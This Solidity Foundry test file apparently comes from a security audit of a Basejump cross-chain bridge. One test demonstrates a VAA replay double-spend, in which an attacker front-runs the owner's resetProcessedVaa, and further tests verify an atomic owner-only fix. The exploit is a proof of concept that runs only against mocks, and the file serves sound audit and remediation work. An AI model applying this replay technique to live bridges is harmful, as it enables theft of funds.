// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {IWormhole} from "wormhole-solidity-sdk/interfaces/IWormhole.sol";

import {BasejumpProxy} from "../../src/BasejumpProxy.sol";
import {BasejumpLanding} from "../../src/BasejumpLanding.sol";
import {XcmTransactor} from "../../src/XcmTransactor.sol";

import {IBasejumpBase} from "../../src/interfaces/IBasejumpBase.sol";
import {IBasejumpLanding} from "../../src/interfaces/IBasejumpLanding.sol";

import {MockWormhole} from "../mocks/MockWormhole.sol";
import {MockTokenBridge} from "../mocks/MockTokenBridge.sol";
import {MockXcmPrecompile} from "../mocks/MockXcmPrecompile.sol";
import {BasejumpTestHelpers} from "../helpers/BasejumpTestHelpers.sol";

/// @dev Minimal ERC20 with mint for testing
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient balance");
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

// Fix is now in the production contract: BasejumpProxy.fix_resetProcessedVaa()

// ═══════════════════════════════════════════════════════════════════════════
// TEST
// ═══════════════════════════════════════════════════════════════════════════

/// @title Finding1_VaaReplayTest
/// @notice Demonstrates the VAA replay double-spend via resetProcessedVaa
///         and verifies the atomic fix prevents it
contract Finding1_VaaReplayTest is Test, MockWormhole {
    using BasejumpTestHelpers for *;

    // ─── Wormhole mock ─────────────────────────────────────────
    function chainId() external pure returns (uint16) { return MOONBEAM_CHAIN_ID; }
    function messageFee() external pure returns (uint256) { return 0; }

    uint64 private _nextSequence;
    function publishMessage(uint32, bytes memory, uint8) external payable returns (uint64) {
        return _nextSequence++;
    }

    // ─── Constants ──────────────────────────────────────────────
    uint16 constant BASE_CHAIN_ID = 30;
    uint16 constant MOONBEAM_CHAIN_ID = 16;
    uint16 constant HYDRATION_PARA_ID = 2034;
    address constant DISPATCH_PRECOMPILE = 0x0000000000000000000000000000000000000401;
    address constant XCM_PRECOMPILE_ADDR = 0x0000000000000000000000000000000000000817;

    uint256 constant POOL_SIZE = 100_000e6;
    uint256 constant TRANSFER_AMOUNT = 10_000e6;
    uint256 constant FEE = 1e6;

    // ─── Contracts ──────────────────────────────────────────────
    BasejumpProxy public proxyOriginal;
    BasejumpProxy public proxyFixed;
    BasejumpLanding public landing;
    XcmTransactor public xcmTransactor;
    MockTokenBridge public tokenBridge;
    MockERC20 public usdc;

    // ─── Actors ─────────────────────────────────────────────────
    address public owner;
    address public attacker = makeAddr("attacker");
    bytes32 public recipient = BasejumpTestHelpers.addressToBytes32(makeAddr("recipient"));

    // ─── Shared emitter info for VAA building ───────────────────
    address public emitterAddr = makeAddr("basejumpSource");

    function setUp() public {
        owner = address(this);

        // Infrastructure
        tokenBridge = new MockTokenBridge();
        MockXcmPrecompile xcmMock = new MockXcmPrecompile();
        vm.etch(XCM_PRECOMPILE_ADDR, address(xcmMock).code);

        // XcmTransactor
        XcmTransactor xcmImpl = new XcmTransactor(HYDRATION_PARA_ID, MOONBEAM_CHAIN_ID, 38, 6, address(0x802));
        xcmTransactor = XcmTransactor(address(new ERC1967Proxy(
            address(xcmImpl), abi.encodeCall(XcmTransactor.initialize, ())
        )));

        // Original BasejumpProxy (vulnerable)
        BasejumpProxy proxyImpl = new BasejumpProxy();
        proxyOriginal = BasejumpProxy(address(new ERC1967Proxy(
            address(proxyImpl), abi.encodeCall(BasejumpProxy.initialize, (address(this), address(tokenBridge)))
        )));

        // Same contract — fix_resetProcessedVaa is now in the production BasejumpProxy
        BasejumpProxy fixedImpl = new BasejumpProxy();
        proxyFixed = BasejumpProxy(address(new ERC1967Proxy(
            address(fixedImpl), abi.encodeCall(BasejumpProxy.initialize, (address(this), address(tokenBridge)))
        )));

        // Landing
        BasejumpLanding landingImpl = new BasejumpLanding();
        landing = BasejumpLanding(address(new ERC1967Proxy(
            address(landingImpl), abi.encodeCall(BasejumpLanding.initialize, ())
        )));

        // Token
        usdc = new MockERC20();

        // Configure original proxy
        _configureProxy(proxyOriginal);
        // Configure fixed proxy
        _configureProxy(BasejumpProxy(address(proxyFixed)));

        // Configure Landing
        landing.setAuthorizedBridge(address(proxyOriginal), true);
        landing.setAuthorizedBridge(address(proxyFixed), true);
        landing.setDestAsset(address(usdc), address(usdc));

        // Fund landing pool
        usdc.mint(address(landing), POOL_SIZE);

        // Mock dispatch precompile (always succeeds)
        vm.mockCall(DISPATCH_PRECOMPILE, bytes(""), bytes(""));

        // Fund for gas
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
    }

    function _configureProxy(BasejumpProxy proxy) internal {
        proxy.setLanding(BASE_CHAIN_ID, BasejumpTestHelpers.addressToBytes32(address(landing)));
        proxy.setAuthorizedEmitter(BASE_CHAIN_ID, BasejumpTestHelpers.addressToBytes32(emitterAddr));
        proxy.setXcmTransactor(address(xcmTransactor));
        xcmTransactor.setAuthorized(address(proxy), true);
    }

    function _buildVAA(uint256 amount) internal view returns (bytes memory) {
        return BasejumpTestHelpers.buildFastPathVAA(
            BASE_CHAIN_ID, emitterAddr, address(usdc), amount, recipient, 0
        );
    }

    // ═══════════════════════════════════════════════════════════════
    // EXPLOIT: VAA Replay Double-Spend
    // ═══════════════════════════════════════════════════════════════

    /// @notice Demonstrates that resetProcessedVaa allows an attacker to
    ///         front-run the owner's intended replay, causing a double-spend.
    ///
    ///         The actual token movement happens on Hydration via XCM (out of scope
    ///         for this EVM test). We verify the exploit by counting XCM dispatches:
    ///         the same VAA triggers _executeTransfer (and thus XcmTransactor.transact)
    ///         TWICE — once legitimately, once via attacker replay.
    function test_exploit_vaaReplayDoubleSpend() public {
        uint256 amount = TRANSFER_AMOUNT;
        bytes memory vaa = _buildVAA(amount);
        MockXcmPrecompile xcmMock = MockXcmPrecompile(XCM_PRECOMPILE_ADDR);

        // ─── Step 1: Normal VAA processing ────────────────────────
        proxyOriginal.completeTransfer(vaa);

        uint256 xcmCountAfterFirst = xcmMock.callCount();
        assertEq(xcmCountAfterFirst, 1, "Should have 1 XCM dispatch after first transfer");
        console.log("XCM dispatches after 1st transfer:", xcmCountAfterFirst);

        // ─── Step 2: Replay should fail (protected) ───────────────
        vm.expectRevert("VAA already processed");
        proxyOriginal.completeTransfer(vaa);
        assertEq(xcmMock.callCount(), 1, "XCM count unchanged - replay blocked");

        // ─── Step 3: Owner resets VAA for "recovery" ──────────────
        bytes32 vaaHash = keccak256(vaa);
        proxyOriginal.resetProcessedVaa(vaaHash);

        // ─── Step 4: ATTACKER front-runs the owner's retry ────────
        // The VAA is now replayable by ANYONE — not just the owner
        vm.prank(attacker);
        proxyOriginal.completeTransfer(vaa);

        uint256 xcmCountAfterReplay = xcmMock.callCount();
        assertEq(xcmCountAfterReplay, 2, "XCM dispatched TWICE - double-spend!");
        console.log("XCM dispatches after attacker replay:", xcmCountAfterReplay);

        // ─── Verify: Same transfer payload dispatched both times ──
        MockXcmPrecompile.XcmCall memory call1 = xcmMock.getCall(0);
        MockXcmPrecompile.XcmCall memory call2 = xcmMock.getCall(1);
        assertEq(keccak256(call1.call), keccak256(call2.call), "Both XCM calls carry identical payload");

        console.log("EXPLOIT CONFIRMED: Same VAA triggered 2 XCM dispatches (double-spend)");
    }

    // ═══════════════════════════════════════════════════════════════
    // FIX: Atomic Recovery Prevents Front-Running
    // ═══════════════════════════════════════════════════════════════

    /// @notice Verifies that fix_resetProcessedVaa atomically resets and
    ///         replays the VAA in a single transaction, leaving no window
    ///         for an attacker to front-run.
    function test_fix_atomicRecoveryPreventsReplay() public {
        uint256 amount = TRANSFER_AMOUNT;
        bytes memory vaa = _buildVAA(amount);
        MockXcmPrecompile xcmMock = MockXcmPrecompile(XCM_PRECOMPILE_ADDR);

        // ─── Step 1: Normal VAA processing ────────────────────────
        proxyFixed.completeTransfer(vaa);
        assertEq(xcmMock.callCount(), 1, "First transfer dispatched");

        // ─── Step 2: Owner uses atomic fix_resetProcessedVaa ──────
        // This resets AND replays in the same tx — no front-run window
        proxyFixed.fix_resetProcessedVaa(vaa);
        assertEq(xcmMock.callCount(), 2, "Recovery dispatched the transfer again");

        // ─── Step 3: Attacker tries to replay — BLOCKED ───────────
        // The VAA is marked as processed again after the atomic recovery
        vm.prank(attacker);
        vm.expectRevert("VAA already processed");
        proxyFixed.completeTransfer(vaa);

        // XCM count stays at 2 — attacker couldn't trigger a 3rd dispatch
        assertEq(xcmMock.callCount(), 2, "Attacker blocked - no extra dispatch");

        console.log("FIX VERIFIED: Atomic recovery executed, attacker blocked");
    }

    /// @notice Verifies that fix_resetProcessedVaa can only be called by owner
    function test_fix_onlyOwnerCanRecover() public {
        bytes memory vaa = _buildVAA(TRANSFER_AMOUNT);
        proxyFixed.completeTransfer(vaa);

        vm.prank(attacker);
        vm.expectRevert();
        proxyFixed.fix_resetProcessedVaa(vaa);
    }

    /// @notice Verifies that fix_resetProcessedVaa reverts for unprocessed VAAs
    function test_fix_cannotRecoverUnprocessedVaa() public {
        bytes memory vaa = _buildVAA(TRANSFER_AMOUNT);

        // VAA was never processed
        vm.expectRevert("VAA not processed");
        proxyFixed.fix_resetProcessedVaa(vaa);
    }
}
